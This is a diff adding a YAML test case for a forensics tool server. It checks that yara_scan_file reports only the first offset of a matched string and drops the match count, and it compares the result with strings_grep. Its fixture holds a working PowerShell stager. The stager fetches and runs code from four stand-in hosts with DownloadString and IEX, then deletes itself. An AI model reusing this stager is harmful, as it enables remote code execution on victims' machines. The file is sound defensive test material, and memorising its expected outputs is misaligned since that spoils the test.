@@ -1,0 +1,86 @@
+# Matrix case P4117-129: yara_scan_file (and the other YARA tools, which share
+# _match_to_dict) returns, for each matched string, only the offset of its
+# first instance (s.instances[0]) and drops how many times it matched, without
+# saying so. A string that matched several times reads as matched once.
+# The rule is a count rule (#dl >= 3), so the match itself proves the string
+# occurs at least three times. The sample is a PowerShell stager that pulls
+# four stages from four different hosts. The match is done by yara-python
+# (real); strings_grep (real strings) shows the four lines.
+case_id: P4117-129
+problem: P4117
+server: trudi
+variant: trudi-88fbca7
+commit: 88fbca78186b6a0ca40423cf5e37a9dc46ae051e
+display: multi-call
+level: mcp
+realism: common
+realism_ko: "다단계 PowerShell 스테이저가 여러 주소에서 다음 단계를 받는 것은 흔하고, `#문자열 >= N` 같은 횟수 조건 규칙도 흔하다."
+coverage: full
+summary: On a PowerShell stager with four DownloadString calls to four hosts, yara_scan_file matches a rule that needs at least three of them (#dl >= 3) but lists $dl once with the offset of the first call only, while strings_grep on the same file finds four DownloadString lines.
+summary_ko: "DownloadString 호출 4개(호스트 4곳)가 든 PowerShell 스테이저에서, yara_scan_file은 3번 이상 나와야 맞는 규칙(`#dl >= 3`)에 일치했다고 하면서 `$dl`을 첫 호출의 오프셋 하나로만 싣는다. 같은 파일에 strings_grep을 돌리면 DownloadString 줄이 4개 나온다."
+defect_ko: "이 서버는 일치한 문자열마다 첫 번째 위치 하나만 싣고 일치 횟수를 버린다. 정상이라면 일치 횟수와 위치를 모두 싣거나, 첫 위치만 실었다고 밝혀야 한다. 모델은 다운로드가 한 번, 한 호스트에서만 일어났다고 잘못 안다."
+setup_ko: "네 호스트에서 다음 단계를 받는 PowerShell 스테이저 스크립트와, DownloadString이 3번 이상 나오면 맞는 규칙을 넣었다."
+env:
+  TRUDI_CACHE_DIR: ${DB_DIR}/cache
+fixture:
+  - path: rules/ps_download_cradles.yar
+    root: db
+    text: |
+      rule SUSP_PS_Multi_Download_Cradle
+      {
+          meta:
+              description = "PowerShell script fetching several remote stages with Net.WebClient.DownloadString"
+              author = "ir-team"
+          strings:
+              $dl = "DownloadString(" ascii nocase
+              $wc = "Net.WebClient" ascii nocase
+          condition:
+              $wc and #dl >= 3
+      }
+  - path: C/Users/j.doe/AppData/Roaming/Microsoft/Windows/Templates/update.ps1
+    text: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $wc = New-Object System.Net.WebClient
+      $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+      $s1 = $wc.DownloadString('http://cdn-update.example.net/a/stage1.ps1')
+      IEX $s1
+      $s2 = (New-Object Net.WebClient).DownloadString('http://198.51.100.23:8080/b.txt')
+      IEX $s2
+      $cfg = (New-Object Net.WebClient).DownloadString('https://pastebin.example.com/raw/Xk3pQ9')
+      $o = (New-Object Net.WebClient).DownloadString('http://203.0.113.7/office/upd.ps1')
+      IEX $o
+      Remove-Item $MyInvocation.MyCommand.Path -Force
+  - path: case01/analysis/.keep
+    root: outside
+    text: ""
+steps:
+  - tool: misc_start_execution_log
+    note_ko: "준비: 사건 기록을 연다"
+    args:
+      case_id: CASE-001
+      output_path: ${OUTSIDE}/case01/analysis/trace.json
+      case_dir: ${OUTSIDE}/case01
+      launch_dashboard: false
+  - tool: yara_scan_file
+    note_ko: "결함 호출: 스크립트를 횟수 조건 규칙으로 검사함"
+    args:
+      file_path: ${EVIDENCE}/C/Users/j.doe/AppData/Roaming/Microsoft/Windows/Templates/update.ps1
+      rules_path: ${DB_DIR}/rules/ps_download_cradles.yar
+  - tool: strings_grep
+    note_ko: "비교 호출: 같은 파일에서 DownloadString 줄을 찾음"
+    args:
+      file_path: ${EVIDENCE}/C/Users/j.doe/AppData/Roaming/Microsoft/Windows/Templates/update.ps1
+      pattern: DownloadString
+expect:
+  - step: 2
+    note_ko: "DownloadString이 3번 이상이어야 맞는 규칙에 일치한다"
+    contains: '"rule": "SUSP_PS_Multi_Download_Cradle"'
+  - step: 2
+    note_ko: "그런데 $dl은 위치 하나로만 실리고 일치 횟수가 없다"
+    regex: '"strings": \[\{"offset": \d+, "identifier": "\$dl"\}, \{"offset": \d+, "identifier": "\$wc"\}\]'
+  - step: 3
+    note_ko: "같은 파일에 DownloadString 줄이 4개 있다"
+    regex: '"match_count": 4\b'
+  - step: 3
+    note_ko: "네 번째 호출은 첫 호출과 다른 호스트 203.0.113.7에서 받는다"
+    contains: "http://203.0.113.7/office/upd.ps1"
